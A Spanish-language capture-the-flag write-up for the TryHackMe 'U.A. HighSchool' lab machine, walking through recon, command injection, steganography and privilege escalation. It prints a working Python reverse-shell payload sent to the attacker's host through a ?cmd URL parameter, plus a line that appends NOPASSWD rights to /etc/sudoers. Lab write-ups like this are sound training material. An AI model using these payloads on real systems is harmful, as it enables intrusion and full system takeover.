---
title: HighSchool
description: Write Up de la máquina High School de la plataforma TryHackMe
published: true
date: 2025-05-11T11:57:58.747Z
tags: 
editor: markdown
dateCreated: 2025-05-06T15:54:10.908Z
---

# U. A. HighSchool
Bienvenido al write up de la maquina HighSchool de TryHackMe.

## Reconocimiento
Lo primero que vamos a hacer es un analisis de los puertos disponibles donde encontramos tanto el puerto 22, como el puerto 80.
```
nmap -sT -Pn -sV 10.10.229.240
```
IMAGEN 1

Así que vamos a entrar en el website, para saber que hay.

Podemos empezar a hacer uso del dirb para comprobar las entradas a los que tenemos acceso.
```
dirb http://{IP}
```
IMAGEN 2

Dentro del analisis hemos encontrado la carpeta assest, aquí vamos a entrar a comprobar que mas cosas interesantes podemos encontrar.

IMAGEN 3

Se carga una página pero aparantemente está vacía por lo que vamos a hacer intentar modificar el URL con un ?cmd, por ejemplo:
?cmd=id

IMAGEN 4

Como podemos observar, nos da una serie de caracteres aparentemente aleatorio, pero aparienta estar cifrado en base64, por lo que vamos a decodificarlo.

IMAGEN 5

El resultado era el esperado, ahora deberemos intentar hacer una shell reversa para tener acceso, ya que la url interpreta comandos.

## Explotación
Podemos intentar hacer una URL con:
*?cmd=export RHOST="10.9.3.144";export RPORT=9000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'*

IMAGEN 6

Como podemos observar, tenemos acceso por lo que la shell reversa ha funcionado perfectamente.

IMAGEN 7

Vamos a securizar la shell para ello ponemos:

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Tras esto hacemoz Ctrl + Z y ponemos stty raw -echo;fg

Le damos a enter dos veces y ponemos export TERM=xterm.

IMAGEN 8

Tras acceder, vamos a mirar lo que hay en la carpeta /var/www, ya que a lo mejor aloja otro servicio.
IMAGEN 9

Sin embargo está cifrada, por lo que deberemos emplear alguna herramienta para descifrarla.

IMAGEN 10

Una vez realizado, podemos observar como la contraseña es "AllmightForEver!!!"

Sin embargo, creemos que está contraseá corresponderá a alguna imagen, vamos a mirar que imagenes hay en el servidor activo.

IMAGEN 11

Como podemos observar tenemos dos imagenes, vamos a obtenerla en nuestra Kali, con un wget.

IMAGEN 12

Si nos digimos a las imagenes, podemos observar como yuei.jpg si que está correcta, sin embargo oneforall.jpg, está corrompida.

IMAGEN 13

Para arreglarla, vamos a usar una herramienta llamada MagicBytes, del github Haxrein.

para ello haremos:
```
git clone https://github.com/Haxrein/MagicBytes.git
```

IMAGEN 14

Una vez clonado el Git, vamos a usarlo para reparar la imagen mediante el siguiente comando:
```
python3 magicbytes.py -i {ruta del archivo} -m jpg
```

IMAGEN 15

Ahora si que podriamos usar steghide, para sacar la esteganografía detras de la imagen.

Para ello vamos a hacer uso de steghide de la siguiente manera:
```
steghide extract -sf {imagenes}
```
Y cuando nos pidan la passphrase, podemos usar la que anteriormente hemos obtenido 

IMAGEN 16

Como podemos observar, ha funcionado con oneforall.jgp, sin embargo con yuei.jpg, no.

Obtenemos leemos el archivo mediante un cat creds.txt.

IMAGEN 17

Tras esto podemos leer que tenemos unas credenciales y podemos loguearnos como el usuario "deku".

IMAGEN 18

Nos dirigimos al home del usuario y encontraremos la primera flag.


IMAGEN 19



Ahora vamosa intentar escalar privilegios, para ello vamos a hacer uso de

```
sudo -l
```

IMAGEN 20

Como podemos observar, podemos ejecutar un script llamado feedback, como root, vamos a leerlo.


IMAGEN 21

El script hace lo siguiente paso por paso:
1. Saluda al usuario
2. Lee un parametro llamado feedback
3. Si el feedback tiene una serie de caracteres previlegios, da un error.
4. Si el feedback es correcto, lo escribe por pantalla y lo guarda en un archivo llamado /var/log/feedback.txt

Para saltarnos está restricción podemos hacer varias cosas, una de ellas puede ser:
- Escribir en /etc/sudoers privilegios a nuestro usuario.

Para ello vamos a poner "deku ALL=NOPASSWD: ALL >> /etc/sudoers"

IMAGEN 22

Tras esto podemos observar como tenemos root, y podemos leer la última flag.
IMAGEN 23